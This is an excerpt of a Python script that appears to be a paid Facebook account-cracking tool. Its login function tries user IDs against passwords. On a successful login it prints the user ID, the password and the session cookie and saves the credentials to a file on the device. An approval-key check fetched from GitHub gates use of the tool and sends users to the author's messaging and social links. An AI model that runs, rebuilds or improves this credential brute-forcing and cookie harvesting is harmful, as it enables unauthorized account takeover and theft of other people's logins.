...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801798201679');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://facebook.com/groups/735209235013629/');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/mdajaharul200');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [RAHAT-OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/RAHAT-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    RAHAT=requests.get("https://github.com/mdajaharul200/CONTROL-GITHUB/blob/main/Aproval.tex").text
    if id in RAHAT:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://t.me/@mdajaharul")
        time.sleep(3.0)
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am RAHAT BAI er  ROBOT and my boss is rahat sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://www.facebook.com/ajaharulm899?mibextid=ZbWKwL")
        superuser()        
superuser()
